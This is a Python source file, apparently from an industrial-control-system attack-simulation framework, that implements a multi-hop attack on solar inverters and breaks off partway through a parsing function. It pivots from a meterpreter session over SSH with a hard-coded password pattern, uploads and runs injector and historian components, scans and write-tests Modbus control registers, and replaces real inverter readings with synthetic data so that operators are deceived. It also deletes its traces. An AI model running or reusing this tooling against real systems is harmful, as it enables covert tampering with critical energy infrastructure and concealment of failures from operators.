"""
A class to simulate attacks on industrial control systems using data streaming.
This attack extends the WateringHoleAttack to establish initial access, then deploys
a historian (server) and injector (client) to simulate data exfiltration or injection.

Connection flow:
1. MSF connection to the injector system (first hop)
2. SSH connection from injector to historian (second hop)

=== ATTACK OVERVIEW ===

This code implements a sophisticated "digital heist" against solar power systems,
seamlessly replacing real inverter data with synthetic data to avoid detection.

The Attack Flow (Like a Movie Heist):

Phase 1 - Breaking In ("Watering Hole"):
    - Establish initial access via compromised websites/systems
    - Gain foothold inside the target network
    - Deploy meterpreter session for command & control

Phase 2 - Setting Up Operations:
    - Deploy "Historian" (data processing server) via SSH
    - Deploy "Injector" (data transmission client) via meterpreter
    - Install dependencies and establish secure communication channels

Phase 3 - Intelligence Gathering ("Auto-Discovery"):
    - Automatically discover inverter register mappings without prior knowledge
    - Identify data registers (voltage, current, power measurements)
    - Locate control registers (potential disable/enable switches)
    - Classify register types and assess manipulation confidence
    - Works across different inverter brands/models

Phase 4 - The Switcheroo ("Seamless Data Transition"):
    - Sample current real inverter data as baseline
    - Generate realistic synthetic data with proper electrical characteristics
    - Execute 30-second exponential blend: real → synthetic data
    - Deploy transition data to historian for injection
    - Maintain statistical properties, noise patterns, and physical constraints

Phase 5 - Taking Control ("Stream Interruption"):
    - Attempt graceful disable via discovered control registers
    - Fallback to communication flooding if direct control fails
    - Verify successful interruption of original data stream
    - Ensure synthetic data becomes the primary source

Phase 6 - Mission Success:
    - Fake data flows to control systems instead of real measurements
    - Operators see normal-looking solar performance data
    - Attack remains undetected due to realistic data patterns
    - Maintains persistent control over information flow

=== KEY CAPABILITIES ===

Auto-Discovery Engine:
    - Scans register ranges to identify meaningful data sources
    - Analyzes sensor patterns to distinguish real vs. static data
    - Maps discovered registers to electrical parameters (DCA, DCV, PhVphA, AphA)
    - Classifies control registers by function and confidence level

Sophisticated Data Synthesis:
    - Generates realistic electrical measurements with proper noise
    - Maintains physical constraints (voltage/current limits)
    - Includes cyclical patterns and random walk components
    - Preserves statistical relationships between parameters

Stealth & Evasion:
    - All operations route through compromised systems (no direct connections)
    - Gradual transition prevents sudden discontinuities
    - Safe discovery methods avoid triggering alarms
    - Multiple fallback strategies ensure attack success

=== REAL-WORLD IMPACT ===

This attack enables adversaries to:
    - Hide equipment failures or performance degradation
    - Manipulate energy production reports and market data
    - Mask physical attacks on solar infrastructure
    - Create false baselines for future malicious activities
    - Maintain persistent, undetectable control over critical data streams

The result: Perfect digital camouflage that makes synthetic solar data
indistinguishable from authentic measurements to monitoring systems.

=== TECHNICAL INNOVATION ===

- Auto-discovery for unknown Modbus layouts
- Advanced statistical modeling for realistic data synthesis
- Multi-hop attack chain through compromised infrastructure
- Seamless integration with existing penetration testing frameworks
- Production-quality error handling and operational security
"""

import json
import logging
import math
import os
import random
import re
import subprocess
import time

from pymetasploit3.msfrpc import MeterpreterSession
from typing import Any, Dict, List, Optional, Union

from controller.modbus.ModbusAttack import ModbusAttack, ModbusCommand, ModbusConstants
from controller.WateringHoleAttack import WateringHoleAttack
from controller.settings import (
    STREAM_SOURCE_DATA_FILE,
    STREAM_INTERVAL_MS,
    INVERTER_IP_ADDRESS,
    AGGREGATOR_IP_ADDRESS,
    AGGREGATOR_SSH_USER,
    AGGREGATOR_SSH_PASSWORD,
)


class StreamAttack(ModbusAttack):
    historian_process: Optional[subprocess.Popen[bytes]] = None
    injector_process: Optional[subprocess.Popen[bytes]] = None

    # Constants for the streaming components
    SERVER_PORT = 50051

    # Path configuration for deployment
    REMOTE_AGGREGATOR_DIR = "/tmp/historian"
    REMOTE_INJECTOR_DIR = "/tmp/injector"

    # ==========================================
    # 1. INITIALIZATION & CONFIGURATION
    # ==========================================
    def __init__(self, methodName: str = "runTest", is_helper: bool = False) -> None:
        """
        Initialize the StreamAttack class.

        Args:
            methodName: Name of the test method to be executed
            is_helper: Flag indicating if this is a helper class
        """
        if not is_helper:
            super().__init__(methodName)

    @classmethod
    def setUpClass(cls) -> None:
        """Initialize attack environment and establish reverse shell."""
        super().setUpClass()
        cls.watering_hole = WateringHoleAttack(is_helper=True)
        cls.watering_hole.set_msf_client(cls.msf_client)
        cls.watering_hole.establish_reverse_shell()

    def setUp(self) -> None:
        """Prepare the environment for streaming attacks."""
        self._validate_configuration()
        self._deploy_streaming_components()

    def _validate_configuration(self) -> None:
        """Validate required configuration parameters."""
        required_configs = [
            ("INVERTER_IP_ADDRESS", INVERTER_IP_ADDRESS),
            ("AGGREGATOR_IP_ADDRESS", AGGREGATOR_IP_ADDRESS),
            ("AGGREGATOR_SSH_USER", AGGREGATOR_SSH_USER),
            ("AGGREGATOR_SSH_PASSWORD", AGGREGATOR_SSH_PASSWORD),
        ]

        for name, value in required_configs:
            if not value:
                raise ValueError(f"Required configuration missing: {name}")

    @classmethod
    def tearDownClass(cls) -> None:
        """Clean up after all tests."""
        try:
            if hasattr(cls, "watering_hole") and cls.watering_hole:
                cls.watering_hole.tearDown()
        finally:
            super().tearDownClass()

    def tearDown(self) -> None:
        """Clean up after each test."""
        self._cleanup_streaming_processes()
        super().tearDown()

    # ==========================================
    # 2. INFRASTRUCTURE DEPLOYMENT
    # ==========================================
    def _deploy_streaming_components(self) -> None:
        """
        Deploy the historian (server) and injector (client) components to the
        target systems using the established connections.
        """
        logging.info("Deploying streaming components")

        # Get the meterpreter session established by WateringHoleAttack (to injector)
        session = self.meterpreter_session
        if not session:
            raise RuntimeError("No active meterpreter session available")

        # Establish connection to the historian system
        self._establish_historian_connection()

        # Deploy files to the injector first (via meterpreter)
        self._deploy_injector(session)

        # Then deploy files to the historian (via SSH)
        self._deploy_historian()

        logging.info("Streaming components deployed successfully")

    def _establish_historian_connection(self) -> None:
        """
        Establish an SSH connection to the historian system from the injector.
        """
        logging.info("Establishing connection to historian system")

        # Use the meterpreter session to establish SSH to the historian
        session = self.meterpreter_session
        if not session:
            raise RuntimeError("No active meterpreter session available")

        # Check if sshpass is available for password authentication
        sshpass_check = self.send_msf_shell_command("which sshpass", session)
        if "sshpass" not in sshpass_check:
            raise RuntimeError(
                "sshpass not available on injector system - cannot perform automated SSH authentication"
            )

        # Use meterpreter session to establish SSH connection to historian
        ssh_command = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS}"

        # Test the SSH connection by running a simple command
        test_command = f"{ssh_command} 'echo SSH_CONNECTION_SUCCESS'"
        result = self.send_msf_shell_command(test_command, session)

        if "SSH_CONNECTION_SUCCESS" not in result:
            raise RuntimeError(f"SSH connection test failed: {result}")

        logging.info("SSH connection to historian established")

    def _deploy_historian(self) -> None:
        """
        Deploy the historian (server) component to the historian system via SSH.
        This component acts as the data historian in the simulated ICS environment.
        """
        logging.info("Deploying historian component")

        # Make sure we have an SSH session to the historian
        session = self.meterpreter_session
        if not session:
            raise RuntimeError(
                "No meterpreter session available for historian deployment"
            )

        # Create directory structure
        ssh_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' ssh -o StrictHostKeyChecking=no {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS} 'mkdir -p {self.REMOTE_AGGREGATOR_DIR}'"
        self.send_msf_shell_command(ssh_cmd, session)

        # Upload files via SCP through meterpreter
        files_to_upload = [
            (
                "controller/stream/historian/requirements.txt",
                "requirements.txt",
            ),
            ("controller/stream/historian/server.py", "server.py"),
            (
                "controller/stream/historian/data_stream_pb2.py",
                "data_stream_pb2.py",
            ),
            (
                "controller/stream/historian/data_stream_pb2_grpc.py",
                "data_stream_pb2_grpc.py",
            ),
            (STREAM_SOURCE_DATA_FILE, "inject_data.csv"),
        ]

        for local_file, remote_filename in files_to_upload:
            # First upload to injector system
            injector_temp_path = f"/tmp/{remote_filename}"
            self.send_msf_command(f"upload {local_file} {injector_temp_path}", session)

            # Then copy from injector to historian
            scp_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' scp -o StrictHostKeyChecking=no {injector_temp_path} {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS}:{self.REMOTE_AGGREGATOR_DIR}/{remote_filename}"
            self.send_msf_shell_command(scp_cmd, session)

            # Clean up temp file on injector
            self.send_msf_shell_command(f"rm {injector_temp_path}", session)

        # Install dependencies
        pip_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' ssh -o StrictHostKeyChecking=no {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS} 'pip3 install -r {self.REMOTE_AGGREGATOR_DIR}/requirements.txt || pip install -r {self.REMOTE_AGGREGATOR_DIR}/requirements.txt'"
        self.send_msf_shell_command(pip_cmd, session)

    def _deploy_injector(self, session: MeterpreterSession) -> None:
        """
        Deploy the injector (client) component to the injector system through the meterpreter session.
        This component acts as the malicious injector in the simulated ICS environment.
        """
        logging.info("Deploying injector component")

        # Create directory structure on the injector system
        self.send_msf_shell_command(f"mkdir -p {self.REMOTE_INJECTOR_DIR}", session)

        for filename in [
            "controller/stream/injector/requirements.txt",
            "controller/stream/injector/client.py",
            "controller/stream/historian/data_stream_pb2.py",
            "controller/stream/historian/data_stream_pb2_grpc.py",
        ]:
            remote_path = f"{self.REMOTE_INJECTOR_DIR}/{os.path.basename(filename)}"
            self.send_msf_command(f"upload {filename} {remote_path}", session)

        # Install dependencies
        self._check_dependencies(
            session, f"{self.REMOTE_INJECTOR_DIR}/requirements.txt", use_ssh=False
        )

    def _check_dependencies(
        self, session: MeterpreterSession, requirements_path: str, use_ssh: bool = False
    ) -> None:
        """
        Check if required dependencies are installed on the target system.

        Args:
            session: The meterpreter session to use
            requirements_path: Path to the requirements.txt file on the target
            use_ssh: Whether to use SSH commands or meterpreter commands
        """
        logging.info(f"Checking Python dependencies using {requirements_path}")

        if use_ssh:
            # Using SSH commands through meterpreter (for historian)
            # Check Python version
            python_check_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' ssh -o StrictHostKeyChecking=no {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS} 'python3 --version'"
            python_check = self.send_msf_shell_command(python_check_cmd, session)

            if "Python 3" not in python_check:
                logging.warning(
                    "Python 3 not found on target, attempting to use 'python' command"
                )
                python_check_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' ssh -o StrictHostKeyChecking=no {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS} 'python --version'"
                python_check = self.send_msf_shell_command(python_check_cmd, session)

                if "Python 3" not in python_check:
                    raise RuntimeError("Python 3 not available on historian system")

            # Check pip and install required packages
            pip_check_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' ssh -o StrictHostKeyChecking=no {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS} 'pip3 -V || pip -V'"
            pip_check = self.send_msf_shell_command(pip_check_cmd, session)

            if "pip" not in pip_check:
                raise RuntimeError("pip not available on historian system")

            # Install dependencies from requirements.txt
            pip_install_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' ssh -o StrictHostKeyChecking=no {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS} 'pip3 install -r {requirements_path} || pip install -r {requirements_path}'"
            self.send_msf_shell_command(pip_install_cmd, session)

        else:
            # Using meterpreter session (for injector)
            # Check Python version
            python_check = self.send_msf_shell_command("python3 --version", session)
            if "Python 3" not in python_check:
                logging.warning(
                    "Python 3 not found on target, attempting to use 'python' command"
                )
                python_check = self.send_msf_shell_command("python --version", session)
                if "Python 3" not in python_check:
                    raise RuntimeError("Python 3 not available on injector system")

            # Check pip and install required packages
            pip_check = self.send_msf_shell_command("pip3 -V || pip -V", session)
            if "pip" not in pip_check:
                raise RuntimeError("pip not available on injector system")

            # Install dependencies from requirements.txt
            self.send_msf_shell_command(
                f"pip3 install -r {requirements_path} || "
                f"pip install -r {requirements_path}",
                session,
            )

    # ==========================================
    # 3. PROCESS MANAGEMENT
    # ==========================================
    def _start_historian(self) -> None:
        """Start the historian (server) component on the historian system."""
        logging.info("Starting historian (server) component")

        session = self.meterpreter_session
        if not session:
            raise RuntimeError("No meterpreter session available")

        start_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' ssh -o StrictHostKeyChecking=no {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS} 'cd {self.REMOTE_AGGREGATOR_DIR} && nohup python3 server.py inject_data.csv --frequency {STREAM_INTERVAL_MS} > /tmp/historian.log 2>&1 &'"
        self.send_msf_shell_command(start_cmd, session)

        # Wait for the server to start
        time.sleep(2)

        # Check if the server is running
        check_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' ssh -o StrictHostKeyChecking=no {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS} 'ps aux | grep \"[s]erver.py\"'"
        result = self.send_msf_shell_command(check_cmd, session)

        if "server.py" not in result:
            raise RuntimeError("Failed to start historian (server) component")

        logging.info("Historian (server) started successfully")

    def _start_injector(self, target_ip: str) -> None:
        """Start the injector (client) component on the injector system."""
        logging.info("Starting injector (client) component")

        # Use the meterpreter session to the injector
        session = self.meterpreter_session
        if not session:
            raise RuntimeError("No active meterpreter session available")

        command = f"cd {self.REMOTE_INJECTOR_DIR} && python3 client.py --server {target_ip}:{self.SERVER_PORT}"
        result = self.send_msf_shell_command(command, session)

        logging.info(f"Injector client output: {result}")

    def _cleanup_streaming_processes(self) -> None:
        """Clean up running streaming processes."""
        logging.info("Cleaning up streaming processes")

        # Stop historian process on historian system through meterpreter
        session = self.meterpreter_session
        if session:
            try:
                cleanup_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' ssh -o StrictHostKeyChecking=no {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS} 'pkill -f \"python.*server.py\"'"
                self.send_msf_shell_command(cleanup_cmd, session)
                logging.info("Historian processes terminated")
            except Exception as e:
                logging.warning(f"Error cleaning up historian processes: {e}")

            # Clean up any temporary files on the injector system
            try:
                self.send_msf_shell_command(
                    "rm -f /tmp/*.py /tmp/*.csv /tmp/requirements.txt", session
                )
                logging.info("Temporary files cleaned up on injector")
            except Exception as e:
                logging.warning(f"Error cleaning up temporary files on injector: {e}")

            # Clean up files on historian system
            try:
                cleanup_files_cmd = f"sshpass -p '{AGGREGATOR_SSH_PASSWORD}' ssh -o StrictHostKeyChecking=no {AGGREGATOR_SSH_USER}@{AGGREGATOR_IP_ADDRESS} 'rm -rf {self.REMOTE_AGGREGATOR_DIR} /tmp/historian.log'"
                self.send_msf_shell_command(cleanup_files_cmd, session)
                logging.info("Historian files and logs cleaned up")
            except Exception as e:
                logging.warning(f"Error cleaning up historian files: {e}")

    # ==========================================
    # 4. MODBUS AUTO-DISCOVERY
    # ==========================================
    def _auto_discover_inverter_registers(
        self, session: MeterpreterSession
    ) -> Dict[str, Dict[str, int]]:
        """
        Auto-discover inverter register mappings through the compromised implant.
        Returns a mapping of parameter names to register addresses.
        """
        logging.info("Starting auto-discovery of inverter registers")

        discovered_registers: Dict[str, Dict[int, Any]] = {
            "data_registers": {},
            "control_registers": {},
        }

        # Step 1: Discover data registers (read-only, contain sensor values)
        data_registers = self._discover_data_registers(session)
        discovered_registers["data_registers"] = data_registers

        # Step 2: Discover control registers (write-capable, may disable functionality)
        if not hasattr(self, "_discovered_controls"):
            control_registers = self._discover_control_registers(session)
            discovered_registers["control_registers"] = control_registers
            self._discovered_controls = control_registers

        # Step 3: Map discovered registers to inverter parameters
        mapped_registers = self._map_registers_to_parameters(session, data_registers)

        logging.info(
            f"Auto-discovery complete. Found {len(mapped_registers)} parameter mappings"
        )
        return mapped_registers

    def _discover_data_registers(self, session: MeterpreterSession) -> Dict[int, Any]:
        """Discover readable data registers that contain meaningful values."""
        logging.info("Discovering readable data registers")

        data_registers = {}
        total_scanned = 0
        max_scan_limit = 200  # Prevent excessive scanning

        register_ranges = [
            (3000, 3100),
            (4000, 4100),
            (30000, 30100),
            (40001, 40050),
        ]

        for start_addr, end_addr in register_ranges:
            if total_scanned >= max_scan_limit:
                logging.info(f"Reached scan limit of {max_scan_limit} registers")
                break

            logging.info(f"Scanning register range {start_addr}-{end_addr}")

            for address in range(start_addr, min(end_addr, start_addr + 50)):
                if total_scanned >= max_scan_limit:
                    break

                try:
                    value = self._safe_read_register(session, address)
                    total_scanned += 1

                    if value is not None and 0.01 < value < 60000:
                        data_registers[address] = {
                            "value": value,
                            "timestamp": time.time(),
                            "stable": False,
                        }
                        logging.debug(f"Register {address}: {value}")

                    time.sleep(0.05)

                except Exception as e:
                    logging.debug(f"Register {address} read failed: {e}")
                    total_scanned += 1
                    continue

        # Step 2: Check stability of discovered registers
        stable_registers = self._check_register_stability(session, data_registers)
        logging.info(f"Found {len(stable_registers)} stable data registers")

        return stable_registers

    def _discover_control_registers(
        self, session: MeterpreterSession
    ) -> Dict[int, Any]:
        """Discover writable control registers using safe, non-invasive methods."""
        logging.info(
            "Discovering control registers (safe mode - no functionality testing)"
        )

        control_registers = {}
        control_ranges = [
            (5000, 5050),  # Common control register range
            (40000, 40050),  # Alternative control range
            (1000, 1050),  # Status/control range
            (6000, 6050),  # Extended control range
        ]

        for start_addr, end_addr in control_ranges:
            for address in range(start_addr, end_addr):
                try:
                    # Step 1: Test read capability
                    original_value = self._safe_read_register(session, address)
                    if original_value is None:
                        continue

                    # Step 2: Test write capability (write back same value)
                    write_capable = self._safe_test_write(
                        session, address, original_value
                    )
                    if not write_capable:
                        continue

                    # Step 3: Classify register type based on patterns
                    register_type = self._classify_control_register(
                        session, address, original_value
                    )

                    control_registers[address] = {
                        "original_value": original_value,
                        "writable": True,
                        "register_type": register_type,
                        "confidence": self._assess_control_confidence(
                            address, original_value, register_type
                        ),
                    }

                    logging.info(
                        f"Control register {address}: type={register_type}, value={original_value}"
                    )
                    time.sleep(0.1)

                except Exception as e:
                    logging.debug(f"Control register {address} test failed: {e}")
                    continue

        return control_registers

    def _check_register_stability(
        self, session: MeterpreterSession, registers: Dict[int, Any]
    ) -> Dict[int, Any]:
        """Check which registers have stable, changing values (indicating real sensor data)."""
        logging.info("Checking register stability and variation patterns")

        stable_registers = {}

        # Sample a subset of registers for stability testing (to avoid taking too long)
        sample_addresses = list(registers.keys())[:20]  # Test max 20 registers

        for address in sample_addresses:
            try:
                # Take multiple readings over time
                readings = []
                for i in range(5):
                    value = self._safe_read_register(session, address)
                    if value is not None:
                        readings.append(value)
                    time.sleep(1)  # 1-second intervals for quicker testing

                # Analyze readings for realistic sensor behavior
                if len(readings) >= 3 and self._analyze_sensor_pattern(readings):
                    stable_registers[address] = {
                        "readings": readings,
                        "mean": sum(readings) / len(readings),
                        "variation": max(readings) - min(readings) if readings else 0,
                        "stable": True,
                    }
                    logging.info(
                        f"Register {address} appears to be stable sensor data: mean={stable_registers[address]['mean']:.2f}, variation={stable_registers[address]['variation']:.2f}"
                    )

            except Exception as e:
                logging.debug(f"Stability check failed for register {address}: {e}")
                continue

        return stable_registers

    def _analyze_sensor_pattern(self, readings: List[float]) -> bool:
        """Analyze if readings look like real sensor data."""
        if len(readings) < 3:
            return False

        # Check for reasonable variation (not completely static, not wildly erratic)
        variation = max(readings) - min(readings)
        mean_val = sum(readings) / len(readings)

        if mean_val == 0:
            return False

        # Variation should be 0.05% to 25% of mean value for realistic sensors
        variation_percent = (variation / mean_val) * 100

        # Values should be in realistic ranges for electrical measurements
        realistic_ranges = [
            (0.1, 100),  # Current range (A) - broader range
            (50, 1000),  # Voltage range (V) - broader range
            (0.01, 50),  # Low current measurements
            (100, 500),  # Typical AC voltage range
        ]

        in_realistic_range = any(
            low <= mean_val <= high for low, high in realistic_ranges
        )

        # Check that values aren't all identical (static)
        not_static = variation > 0.001

        # Check that variation isn't too extreme (noisy/invalid)
        not_too_noisy = variation_percent <= 50

        result = (
            not_static
            and not_too_noisy
            and in_realistic_range
            and (0.05 <= variation_percent <= 25)
        )

        if result:
            logging.debug(
                f"Sensor pattern analysis PASSED: mean={mean_val:.3f}, variation={variation:.3f} ({variation_percent:.1f}%), range_ok={in_realistic_range}"
            )
        else:
            logging.debug(
                f"Sensor pattern analysis FAILED: mean={mean_val:.3f}, variation={variation:.3f} ({variation_percent:.1f}%), static={not not_static}, noisy={not not_too_noisy}, range_ok={in_realistic_range}"
            )

        return result

    def _map_registers_to_parameters(
        self, session: MeterpreterSession, data_registers: Dict[int, Any]
    ) -> Dict[str, Dict[str, int]]:
        """Map discovered registers to inverter parameters based on value ranges and characteristics."""
        logging.info("Mapping discovered registers to inverter parameters")

        parameter_mapping = {}

        # Sort registers by address for consistent mapping
        sorted_registers = sorted(data_registers.items(), key=lambda x: x[0])

        for address, reg_info in sorted_registers:
            mean_value = reg_info.get("mean", 0)
            variation = reg_info.get("variation", 0)

            # Classify based on typical electrical parameter ranges
            if 0.1 <= mean_value <= 100 and variation > 0.01:
                # Current measurements (DC or AC)
                if "DCA" not in parameter_mapping and mean_value < 50:
                    parameter_mapping["DCA"] = {"address": address, "count": 1}
                    logging.info(
                        f"Mapped DCA (DC Current A) to register {address} (value: {mean_value:.2f})"
                    )
                elif "AphA" not in parameter_mapping and mean_value < 50:
                    parameter_mapping["AphA"] = {"address": address, "count": 1}
                    logging.info(
                        f"Mapped AphA (AC Current A) to register {address} (value: {mean_value:.2f})"
                    )

            elif 200 <= mean_value <= 1000 and variation < mean_value * 0.1:
                # Voltage measurements (typically more stable)
                if 300 <= mean_value <= 1000 and "DCV" not in parameter_mapping:
                    parameter_mapping["DCV"] = {"address": address, "count": 1}
                    logging.info(
                        f"Mapped DCV (DC Voltage) to register {address} (value: {mean_value:.2f})"
                    )
                elif 100 <= mean_value <= 500 and "PhVphA" not in parameter_mapping:
                    parameter_mapping["PhVphA"] = {"address": address, "count": 1}
                    logging.info(
                        f"Mapped PhVphA (AC Phase Voltage A) to register {address} (value: {mean_value:.2f})"
                    )

            elif 50 <= mean_value <= 500:
                # Could be AC voltage or other measurements
                if "PhVphA" not in parameter_mapping and variation < mean_value * 0.15:
                    parameter_mapping["PhVphA"] = {"address": address, "count": 1}
                    logging.info(
                        f"Mapped PhVphA (AC Phase Voltage A) to register {address} (value: {mean_value:.2f})"
                    )

        # If we didn't find all parameters, try to fill gaps with reasonable guesses
        missing_params = set(["DCA", "DCV", "PhVphA", "AphA"]) - set(
            parameter_mapping.keys()
        )
        available_registers = [
            addr
            for addr, _ in sorted_registers
            if addr not in [info["address"] for info in parameter_mapping.values()]
        ]

        for param in missing_params:
            if available_registers:
                # Assign next available register to missing parameter
                addr = available_registers.pop(0)
                parameter_mapping[param] = {"address": addr, "count": 1}
                logging.info(f"Assigned {param} to register {addr} (fallback mapping)")

        logging.info(f"Final parameter mapping: {list(parameter_mapping.keys())}")
        return parameter_mapping

    def _classify_control_register(
        self, session: MeterpreterSession, address: int, value: float
    ) -> str:
        """Classify control register type based on address patterns and value analysis."""

        # Classification based on address ranges (common Modbus conventions)
        if 5000 <= address <= 5099:
            return "communication_control"  # Often contains enable/disable flags
        elif 6000 <= address <= 6099:
            return "system_control"  # System-wide control registers
        elif 1000 <= address <= 1099:
            return "status_control"  # Status and minor control functions
        elif 40000 <= address <= 40999:
            return "general_control"  # General purpose control

        # Classification based on value patterns
        if value in [0, 1]:
            return "boolean_control"  # Likely enable/disable flags
        elif value in [0, 255, 65535]:
            return "state_control"  # Common state values
        elif 100 <= value <= 999:
            return "parameter_control"  # Likely configuration parameters

        return "unknown_control"

    def _assess_control_confidence(
        self, address: int, value: float, register_type: str
    ) -> str:
        """Assess confidence that this register could affect data streaming."""

        confidence_score = 0

        # Address-based confidence
        if register_type == "communication_control":
            confidence_score += 3
        elif register_type == "system_control":
            confidence_score += 2
        elif register_type == "boolean_control":
            confidence_score += 2

        # Value-based confidence
        if value in [0, 1]:
            confidence_score += 2  # Boolean values often control features
        elif value == 1:
            confidence_score += 1  # Currently enabled state

        # Address pattern confidence (common disable register addresses)
        disable_candidate_addresses = [5000, 5001, 5010, 6000, 6001, 1000, 1001]
        if address in disable_candidate_addresses:
            confidence_score += 2

        # Convert score to confidence level
        if confidence_score >= 5:
            return "high"
        elif confidence_score >= 3:
            return "medium"
        else:
            return "low"

    def _select_best_disable_candidates(
        self, control_registers: Dict[int, Any]
    ) -> List[int]:
        """Select the most likely disable register candidates without testing."""

        candidates = []

        # Sort by confidence and other factors
        sorted_registers = sorted(
            control_registers.items(),
            key=lambda x: (
                x[1].get("confidence") == "high",
                x[1].get("register_type") == "communication_control",
                x[1].get("original_value") == 1,  # Currently enabled
                x[1].get("correlation_score", 0),
            ),
            reverse=True,
        )

        # Take top candidates
        for address, info in sorted_registers[:3]:
            if info.get("confidence") in ["high", "medium"]:
                candidates.append(address)

        logging.info(f"Selected disable register candidates: {candidates}")
        return candidates

    # ==========================================
    # 5. SAFE MODBUS OPERATIONS
    # ==========================================
    def _safe_read_register(
        self, session: MeterpreterSession, address: int
    ) -> Optional[float]:
        """
        Safely read a register value with error handling and fallback strategies.
        Tries multiple register types to find the correct one.
        """
        # Try different register types in order of safety/likelihood
        register_types = [
            "READ_INPUT_REGISTERS",  # Safest - read-only sensors
            "READ_HOLDING_REGISTERS",  # Read/write registers
            "READ_DISCRETE_INPUTS",  # Boolean inputs
            "READ_COILS",  # Boolean outputs
        ]

        for reg_type in register_types:
            try:
                read_options: ModbusCommand = {
                    "OPTIONS": {
                        "RHOSTS": INVERTER_IP_ADDRESS,
                        "RPORT": ModbusConstants.DEFAULT_PORT,
                        "ACTION": reg_type,
                        "DATA_ADDRESS": address,
                        "NUMBER": 1,
                    }
                }

                result = self.execute_modbus_command(read_options, session)

                if result and "error" not in result.lower():
                    value = self._parse_modbus_result(result)
                    if value is not None:
                        logging.debug(
                            f"Successfully read register {address} using {reg_type}: {value}"
                        )
                        return value

            except Exception as e:
                logging.debug(
                    f"Read attempt failed for register {address} with {reg_type}: {e}"
                )
                continue

        # All read attempts failed
        logging.debug(f"Could not read register {address} with any method")
        return None

    def _safe_test_write(
        self, session: MeterpreterSession, address: int, original_value: float
    ) -> bool:
        """
        Test if a register is writable by attempting to write back its original value.
        This is safe because we're not changing anything - just testing write capability.
        """
        try:
            # First, ensure we have the current value
            current_value = self._safe_read_register(session, address)
            if current_value is None:
                logging.debug(
                    f"Cannot test write for register {address} - unable to read current value"
                )
                return False

            # Use the current value (safest) or original_value as backup
            test_value = current_value if current_value is not None else original_value

            # Try writing back the same value (no actual change)
            write_options: ModbusCommand = {
                "OPTIONS": {
                    "RHOSTS": INVERTER_IP_ADDRESS,
                    "RPORT": ModbusConstants.DEFAULT_PORT,
                    "ACTION": "WRITE_SINGLE_REGISTER",
                    "DATA_ADDRESS": address,
                    "NUMBER": 1,
                    "DATA_REGISTERS": str(int(test_value)),
                }
            }

            result = self.execute_modbus_command(write_options, session)

            # Check if write was successful
            if result and "error" not in result.lower():
                # Verify the value is still correct after write
                verify_value = self._safe_read_register(session, address)

                if verify_value is not None and abs(verify_value - test_value) < 0.01:
                    logging.debug(
                        f"Register {address} is writable (verified write/read cycle)"
                    )
                    return True
                else:
                    logging.debug(
                        f"Register {address} write succeeded but verification failed"
                    )
                    return False
            else:
                logging.debug(f"Register {address} write failed: {result}")
                return False

        except Exception as e:
            logging.debug(f"Write test failed for register {address}: {e}")
            return False

    def _safe_batch_read(
        self,
        session: MeterpreterSession,
        addresses: List[int],
        register_type: str = "READ_INPUT_REGISTERS",
    ) -> Dict[int, float]:
        """
        Safely read multiple registers in batches to improve efficiency.
        Falls back to individual reads if batch fails.
        """
        results = {}

        # Try to read in small batches first (more efficient)
        batch_size = 5
        for i in range(0, len(addresses), batch_size):
            batch_addresses = addresses[i : i + batch_size]

            if len(batch_addresses) == 1:
                # Single register - use individual read
                value = self._safe_read_register(session, batch_addresses[0])
                if value is not None:
                    results[batch_addresses[0]] = value
            else:
                # Try batch read
                try:
                    start_addr = min(batch_addresses)
                    count = max(batch_addresses) - start_addr + 1

                    # Only batch if addresses are consecutive
                    if count == len(batch_addresses):
                        batch_options: ModbusCommand = {
                            "OPTIONS": {
                                "RHOSTS": INVERTER_IP_ADDRESS,
                                "RPORT": ModbusConstants.DEFAULT_PORT,
                                "ACTION": register_type,
                                "DATA_ADDRESS": start_addr,
                                "NUMBER": count,
                            }
                        }

                        result = self.execute_modbus_command(batch_options, session)
                        if result:
                            parsed_result = self._parse_modbus_batch_result(
                                result, start_addr, count
                            )
                            results.update(parsed_result)
                            continue

                    # Batch failed or not consecutive - fall back to individual reads
                    for addr in batch_addresses:
                        value = self._safe_read_register(session, addr)
                        if value is not None:
                            results[addr] = value

                except Exception as e:
                    logging.debug(
                        f"Batch read failed for addresses {batch_addresses}: {e}"
                    )
                    # Fall back to individual reads
                    for addr in batch_addresses:
                        value = self._safe_read_register(session, addr)
                        if value is not None:
                            results[addr] = value

            # Small delay between batches to be gentle
            time.sleep(0.1)

        return results

    # ==========================================
    # 6. DATA PARSING & UTILITIES
    # ==========================================
    def _parse_modbus_result(self, result_str: Union[str, Any]) -> Optional[float]:
        """
        Parse Modbus result string to extract numeric value with better error handling.
        """
        if not result_str:
            return None

        try:
            # Handle different result formats
            if isinstance(result_str, str):
                # Try to parse as JSON first
                try:
                    result_dict = json.loads(result_str)
                except json.JSONDecodeError:
                    # If JSON parsing fails, try to extract numeric value from string
                    result_dict = self._extract_numeric_from_string(result_str)
            else:
                result_dict = result_str

            # Extract values from parsed result
            if isinstance(result_dict, dict):
                if "values" in result_dict and result_dict["values"]:
                    # Handle list of values
                    if (
                        isinstance(result_dict["values"], list)
                        and len(result_dict["values"]) > 0
                    ):
